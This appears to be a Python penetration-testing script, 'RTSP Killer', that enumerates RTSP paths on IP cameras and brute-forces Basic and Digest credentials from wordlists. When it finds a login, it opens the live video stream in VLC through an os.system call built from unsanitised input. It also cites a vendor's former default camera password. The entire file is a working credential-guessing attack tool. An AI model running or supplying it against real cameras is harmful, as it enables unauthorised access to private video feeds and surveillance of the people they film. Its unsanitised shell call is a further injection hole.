#!/usr/bin/env python3

# Standard Libraries
import argparse
import base64
import hashlib
import os
import pprint
import re
import socket
import sys
import uuid

# Third-party Libraries
import coloredlogs, logging

'''
Notes:

some camera accept a set of credentials for basic auth but not the same for digest, it is possible theat they use different set of credentials but likely the implementation is bugged... 
(test both auth methods? time consuming but worth? not really, if both are presente basic is the easiest and more reliable, no nounce/stale)
also no idea how to force vlc to use basic auth...

default credentials: https://ipvm.com/reports/ip-cameras-default-passwords-directory
Hikvision (china owned, us banned, oem): Firmware 5.3.0 and up requires unique password creation; previously admin/12345

'''

def is_Stream(s):
    return 'Content-Type: application/sdp' in s

def is_Unauthorized(s):
	return '401 Unauthorized' in s or '401 ClientUnAuthorized' in s

def is_Bad_Response(s):
    return "b''" == s.strip() 

def is_Authorized(s):
    return '200 OK' in s

def is_Not_Found(s):
    return '404 Not Found' in s or '404 Stream Not Found' in s

def use_Basic_Auth(s):
    return 'WWW-Authenticate: Basic' in s

def use_Digest_Auth(s):
    return 'WWW-Authenticate: Digest' in s

def is_Stale(s):
    return 'stale="true"' in s.lower()

def record(pkt, path):
    global results
    if use_Basic_Auth(pkt) and use_Digest_Auth(pkt):
        results['paths'].append({'path': path, 'type': ['basic', 'digest']})
    if use_Basic_Auth(pkt):
        results['paths'].append({'path': path, 'type': ['basic']})
    elif use_Digest_Auth(pkt):
        results['paths'].append({'path': path, 'type': ['digest']})
    elif is_Not_Found(pkt):
        pass
    elif is_Bad_Response(pkt):
        pass
    elif is_Stream(pkt):
        results['paths'].append({'path': path, 'type': ['stream']})
    elif is_Authorized(pkt):
        results['paths'].append({'path': path, 'type': ['200']})

def create_describe_packet(ip, port, path=""):
    setup_pkt = 'DESCRIBE rtsp://%s:%s%s RTSP/1.0\r\n' % (ip, port, path)
    setup_pkt += 'CSeq: 2\r\n'
    setup_pkt += '\r\n'
    return setup_pkt

def create_auth_basic_packet(ip, port, user, passw, path=""):
    cred_clear = user + ":" + passw
    cred_b64 = base64.b64encode(cred_clear.encode('ascii')).decode()
    setup_pkt = 'DESCRIBE rtsp://%s:%s%s RTSP/1.0\r\n' % (ip, port, path)
    setup_pkt += 'CSeq: 2\r\n'
    setup_pkt += 'Authorization: Basic %s\r\n' % cred_b64
    setup_pkt += '\r\n'
    return setup_pkt

def create_auth_digest_packet(ip, port, user, passw, path, nonce, realm):
    uri = "rtsp://%s:%s%s" % (ip, port, path)
    A1 = "%s:%s:%s" % (user, realm, passw)
    A2 = "DESCRIBE:%s" % uri
    response = "%s:%s:%s" % (hashlib.md5(A1.encode()).hexdigest(), nonce, hashlib.md5(A2.encode()).hexdigest())
    response_md5 = hashlib.md5(response.encode()).hexdigest()
    setup_pkt = 'DESCRIBE rtsp://%s:%s%s RTSP/1.0\r\n' % (ip, port, path)
    setup_pkt += 'CSeq: 3\r\n'
    setup_pkt += 'Authorization: Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s"\r\n' % (user, realm, nonce, uri, response_md5)
    setup_pkt += '\r\n'
    return setup_pkt

def send_packet(ip, port, timeout, pkt):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(pkt.encode())
        data = s.recv(1024)
    except KeyboardInterrupt as e:
        logging.error("[Send Packet] The run was interrupted by the user pressing Ctl-C")
        exit()
        #raise KeyboardInterrupt(e)
    except socket.timeout as e:
        logging.warning("[Send Packet] The connection timed out trying to reach the IP provided.")
        return None
    except socket.error as e:
        logging.error("[Send Packet] There is an error encountered in the network communication (%s)" % e)
        return None
    else:
        return repr(data)

def extract_digest_nonce(pkt):
    if pkt:
        m = re.match(".*nonce=\"(.*?)\".*", pkt)
    nonce = None
    if m:
        nonce = m.group(1)
    return nonce

def extract_digest_realm(pkt):
    if pkt:
        m = re.match(".*Digest realm=\"(.*?)\".*", pkt)
    nonce = None
    if m:
        nonce = m.group(1)
    return nonce

def add_error(msg="Undefined"):
    global errors_count
    if errors_count > errors_max:
        logging.error('More than %s bad responses from server, exiting' % errors_max)
        exit()
    errors_count += 1
    logging.warning('Error during communication, continuing without repeating the request (%s)' % msg)

def brute_creds(ip, port, timeout, auth_method, user_list, passw_list, path=''):
    global results
    results['auth_req'] = True
    if auth_method == 'basic':
        logging.debug("[Brute Creds] Basic: Starting bruteforce")
        for user in user_list:
            for passw in passw_list:
                pkt = create_auth_basic_packet(ip, port, user, passw, path)
                pkt_resp = send_packet(ip, port, timeout, pkt)
                logger.verbose("[Brute Creds] Basic: Testing basic creds: %s:%s" % (user, passw))
                logger.verbose("[Brute Creds] Basic: Packet sent: %s" % repr(pkt))
                logger.verbose("[Brute Creds] Basic: Packet resp: %s" % pkt_resp)
                if pkt_resp:
                    if is_Unauthorized(pkt_resp):
                        pass
                    elif is_Bad_Response(pkt_resp):
                        add_error('bad response')
                    else:
                        logger.success("[Brute Creds] Basic: Credentials found %s %s" % (user, passw))
                        results['cred_found'] = True
                        results['cred']['user'] = user
                        results['cred']['passw'] = passw
                        return [user, passw]
                else:
                    add_error('network communication')
        logger.warning("[Brute Creds] Basic: No credentials found")
        logger.warning('Some manufacturers do not have default passwords, try a more human/big password wordlist. If you are able to identify the model you can also specify the username.')
        logger.warning('No default credentials (at least on newer models): Axis, Bosch, Cisco, Dahua, Hanwha, Hikvision, LTS, Northern, Panasonic, Pelco, Samsung')
        return None

    elif auth_method == 'digest':
        logging.debug("[Brute Creds] Digest: Starting bruteforce")
        pkt_req = create_describe_packet(ip, port, path)
        pkt_resp = send_packet(ip, port, timeout, pkt_req)
        for user in user_list:
            for passw in passw_list:
                pkt_req = create_auth_digest_packet(ip, port, user, passw, path, extract_digest_nonce(pkt_resp), extract_digest_realm(pkt_resp))
                pkt_resp = send_packet(ip, port, timeout, pkt_req)
                logger.verbose("[Brute Creds] Digest: Testing digest creds: %s:%s" % (user, passw))
                logger.verbose("[Brute Creds] Digest: Packet sent: %s" % repr(pkt_req))
                logger.verbose("[Brute Creds] Digest: Packet resp: %s" % pkt_resp)
                if pkt_resp:
                    if is_Stale(pkt_resp):
                        add_error('stale response')
                    else:
                        pkt_resp_old = pkt_resp
                        if is_Unauthorized(pkt_resp):
                            pass
                        elif is_Bad_Response(pkt_resp):
                            add_error('bad response')
                        else:
                            logger.success("[Brute Creds] Digest: Credentials found %s %s" % (user, passw))
                            results['cred_found'] = True
                            results['cred']['user'] = user
                            results['cred']['passw'] = passw
                            return [user, passw]
                else:
                    add_error('network communication')
                    pkt_resp = pkt_resp_old
        logger.warning("[Brute Creds] Digest: No credentials found")
        logger.warning('Some manufacturers do not have default passwords, try a more human/big password wordlist. If you are able to identify the model you can also specify the username.')
        logger.warning('No default credentials (at least on newer models): Axis, Bosch, Cisco, Dahua, Hanwha, Hikvision, LTS, Northern, Panasonic, Pelco, Samsung')
        return None
        
def connect(ip, port, path, creds=None):
    cred_string = ""
    if creds:
        cred_string = "%s:%s@" % (creds[0], creds[1])
    cmd = "cvlc rtsp://%s%s:%s%s" % (cred_string, ip, port, path)
    if stream:
        logger.info('Connecting to video stream using VLC')
        logger.verbose('Connection command: %s' % cmd)
        os.system(cmd)
    else:
        logger.verbose('Stream disabled, connection command: %s' % cmd)


def scan(ip, port, timeout, user_list, passw_list, paths_list):
    global results
    ip = ip.strip()
    creds = None
    auth_method = None
    brute_every_route = False
    brute_completed = False
    cred_b = None

    # Test if it possible to enumerate valid paths or every path has authentication
    random_path = '/%s' % uuid.uuid1()
    pkt_rnd = create_describe_packet(ip, port, random_path)
    rstr_rnd = send_packet(ip, port, timeout, pkt_rnd)
    logger.info('Random route: testing rtsp://%s:%s%s' % (ip, port, random_path))
    logger.verbose("Packet sent: %s" % repr(pkt_rnd))
    logger.verbose("Packet resp: %s" % rstr_rnd)
    if rstr_rnd:
        if use_Basic_Auth(rstr_rnd):
            logger.info('Random route: every route (even if not existent) require authentication')
            auth_method = 'basic'
            cred_b = brute_creds(ip, port, timeout, 'basic', user_list, passw_list)
        elif use_Digest_Auth(rstr_rnd):
            logger.info('Random route: every route (even if not existent) require authentication')
            auth_method = 'digest'
            cred_b = brute_creds(ip, port, timeout, 'digest', user_list, passw_list)
        elif is_Not_Found(rstr_rnd):
            logger.info('Random route: not found (good behaviour)')
        elif is_Bad_Response(rstr_rnd):
            logging.error('Bad response from server')
            exit()
        else:
            logger.error('Random route: unexpected response')
            logger.error("Packet sent: %s" % repr(pkt_rnd))
            logger.error("Packet resp: %s" % rstr_rnd)
            #exit()
        if cred_b:
            creds = cred_b
        
        if results['auth_req'] and not results['cred_found']:
            logger.error('Random route: No creds found')
            exit()            
    else:
        logging.error('Random route: no response')
        exit()


    if auth_method == 'digest':
        pkt_req = create_describe_packet(ip, port)
        pkt_resp = send_packet(ip, port, timeout, pkt_req)

    for path in paths_list:

        tmp_route = {'path': path, 'auth': [], 'creds': []}
        if auth_method == 'basic':
            pkt_req = create_auth_basic_packet(ip, port, creds[0], creds[1], path)
        elif auth_method == 'digest':
            pkt_req = create_auth_digest_packet(ip, port, creds[0], creds[1], path, extract_digest_nonce(pkt_resp), extract_digest_realm(pkt_resp))
        else:
            pkt_req = create_describe_packet(ip, port, path)
        pkt_resp = send_packet(ip, port, timeout, pkt_req)
        record(pkt_resp, path)

        if auth_method == 'digest':
            if pkt_resp:
                pkt_resp_old = pkt_resp
            else:
                pkt_resp = pkt_resp_old

        logger.verbose("Testing path: %s" % path)
        logger.verbose("Packet sent: %s" % repr(pkt_req))
        logger.verbose("Packet resp: %s" % pkt_resp)
        
        if pkt_resp:

            if use_Basic_Auth(pkt_resp):
                logger.verbose("Bruteforcing: Basic Authentication")
                cred_b = None
                if brute_completed or brute_every_route:
                    pass
                else:
                    tmp_route['auth'].append('basic')
                    cred_b = brute_creds(ip, port, timeout, 'basic', user_list, passw_list, path)

                if cred_b:
                    creds = cred_b
                    auth_method = 'basic'
                    tmp_route['creds'].append(cred_b)
                    brute_completed = True
                    connect(ip, port, path, creds)
                else:
                    brute_completed = True

            elif use_Digest_Auth(pkt_resp):
                if is_Stale(pkt_resp):
                    add_error('stale response')
                else:
                    tmp_route['auth'].append('digest')
                    logger.verbose("Bruteforcing: Digest Authentication")
                    cred_b = None
                    if brute_completed or brute_every_route:
                        pass
                    else:
                        tmp_route['auth'].append('digest')
                        cred_b = brute_creds(ip, port, timeout, 'digest', user_list, passw_list, path)

                    if cred_b:
                        creds = cred_b
                        auth_method = 'digest'
                        tmp_route['creds'].append(cred_b)
                        brute_completed = True
                        connect(ip, port, path, creds)
                    else:
                        brute_completed = True

            elif is_Authorized(pkt_resp):
                tmp_route['auth'].append('none')
                logger.success("Found valid endpoint without authentication: %s" % path)
                connect(ip, port, path, creds)
            elif is_Not_Found(pkt_resp):
                pass
            elif is_Bad_Response(pkt_resp):
                add_error('bad response')
            else:
                logger.error("Bruteforcing path: unknown response")
                logger.error("Testing path: %s" % path)
                logger.error("Packet sent: %s" % repr(pkt_req))
                logger.error("Packet resp: %s" % pkt_resp)

def read_file(f_path):
    parr = []
    if os.path.isfile(f_path):
        f = open(f_path, 'r')
        for line in f:
            parr.append(line.strip())
        f.close
    return parr

def load_wordlist(user_value, user_file, default_file):
    if user_value and user_file:
        parser.error("Error, can't choose both %s and %s, remove one." % (user_value, user_file))
    elif user_value:
        wordlist = [user_value]
    elif user_file:
        wordlist = read_file(user_file)
    else:
        wordlist = read_file(default_file)
    return wordlist


if __name__ == '__main__':

    # Define arguments
    parser = argparse.ArgumentParser(description='RTSP Killer performs enumeration and bruteforce of the RTSP protocol.', epilog='Usage example: python3 %s -t 10.10.10.234 -p 5440 -v' % sys.argv[0])
    parser.add_argument('-t',			metavar='TARGET', 	    dest='ip', 			help='target (ip or hostname)')
    parser.add_argument('-n',			metavar='PORT', 		dest='port', 		help='RTSP port (default: 554; alternatives: 8554-8,10554,1024,9090,5440)',	type=int, default=554, )
    parser.add_argument('-u',			metavar='USER', 		dest='user', 		help='username for bruteforce')
    parser.add_argument('-U',			metavar='USER_FILE', 	dest='user_file', 	help='username file for bruteforce')
    parser.add_argument('-p',			metavar='PASS', 		dest='passw', 		help='password for bruteforce')
    parser.add_argument('-P',			metavar='PASS_FILE', 	dest='passw_file', 	help='password file for bruteforce')
    parser.add_argument('-r',			metavar='ROUTE', 		dest='path', 		help='routes for bruteforce (entry must start with /)')
    parser.add_argument('-R',			metavar='ROUTES_FILE', 	dest='path_file', 	help='routes file for bruteforce (entries must start with /)')
    parser.add_argument('--timeout',	metavar='SECONDS', 				 			help="set timeout in seconds (default: 5)", 								type=int, default=5)
    parser.add_argument('--no-stream', 	        									help="do not open the stream", 											    action="store_true")
    parser.add_argument("-v", '--verbose', 											help="increase output verbosity", 											action="store_true")
    parser.add_argument("-q", '--quiet', 											help="suppress all messages except for the final one", 						action="store_true")

    # Load user arguments
    args = parser.parse_args()
    ip = args.ip
    port = args.port
    user = load_wordlist(args.user, args.user_file, 'user.txt')
    passw = load_wordlist(args.passw, args.passw_file, 'passw.txt')
    path = load_wordlist(args.path, args.path_file, 'path.txt')
    timeout = args.timeout
    if args.no_stream:
        stream = False
    else:
        stream = True

    errors_max = 10
    errors_count = 0

    # Configure logging
    logger = logging.getLogger(__name__)
    if args.verbose and args.quiet:
        parser.error("Error, can't choose both --quiet and --verbose, remove one.")
    elif args.verbose:
        coloredlogs.install(level='DEBUG', fmt='%(asctime)s, %(message)s')
    elif args.quiet:
        coloredlogs.install(level='CRITICAL', fmt='%(asctime)s, %(message)s')
    else:
        coloredlogs.install(level='INFO', fmt='%(asctime)s, %(message)s')
    logging.SUCCESS = 35
    logging.addLevelName(logging.SUCCESS, 'SUCCESS')
    setattr(logger, 'success', lambda message, *args: logger._log(logging.SUCCESS, message, args))
    logging.VERBOSE = 15
    logging.addLevelName(logging.VERBOSE, 'VERBOSE')
    setattr(logger, 'verbose', lambda message, *args: logger._log(logging.VERBOSE, message, args))

    results = {
        'target': ip,
        'port': port,
        'auth_req': False,
        'cred_found': False,
        'cred': {'user': None, 'passw': None},
        'paths': []
    }

    scan(ip, port, timeout, user, passw, path)

    if not results['auth_req']:
        del results['cred_found']
        del results['cred']
    pp = pprint.PrettyPrinter(indent=4)
    pp.pprint(results)
